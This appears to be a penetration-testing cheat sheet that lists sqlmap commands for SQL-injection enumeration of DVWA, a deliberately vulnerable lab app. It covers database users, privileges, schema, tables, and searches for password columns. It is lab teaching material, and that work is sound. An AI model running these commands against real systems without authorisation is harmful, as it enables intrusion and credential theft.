# 02 - Database Enumeration

Search Tag(s): #sql-injection #sqlmap #enumeration-and-discovery #dvwa

## 2.1 - Manual

- Interactive `--sql-shell` prompt to perform SQL statement queries manually.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>; security=low" --random-agent --sql-shell

sql-shell> SELECT @@VERSION

sql-shell> SELECT table_name FROM information_schema.tables

sql-shell> SELECT column_name FROM information_schema.columns

sql-shell> SELECT USER()

sql-shell> SELECT DATABASE()

sql-shell> SELECT GRANTEE, IS_GRANTABLE, PRIVILEGE_TYPE, TABLE_CATALOG FROM information_schema.USER_PRIVILEGES
```

## 2.2 - Automated Enumeration

- Banner grab DBMS backend.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>; security=low" --random-agent -b
```

- Fingerprint the DBMS server extensively.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>; security=low" --random-agent -f
```

- Enumerate current user database and check if it's DB administrator.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>; security=low" --random-agent --current-user --is-dba 
```

- Enumerate user database accounts

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>; security=low" --random-agent --users
```

- Enumerate privileges

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>; security=low" --random-agent --privileges -U CU
```

- Enumerate roles.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>; security=low" --random-agent --roles -U CU
```

- Enumerate database schema.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>; security=low" --random-agent --schema
```

- Enumerate current database.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>; security=low" --random-agent --current-db
```

- Enumerate database schema yet exclude system databases.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>; security=low" --random-agent --schema --exclude-sysdbs
```

- Enumerate available databases.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>; security=low" --random-agent --dbs
```

#### 2.2.2 - Tables Enumeration

- Search particular keywords of database, tables and columns

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>; security=low" --random-agent --search -D dvwa -C user,pass,username,password
```

- Count number of tables.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>; security=low" --random-agent -D dvwa --tables --count
```

- Retrieve relation (tables).

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>; security=low" --random-agent -D dvwa --tables
```

#### 2.2.3 - Columns Enumeration

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>; security=low" --random-agent -D dvwa -T users --columns
```

#### 2.2.4 - SQL Comments

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>; security=low" --random-agent --comments
```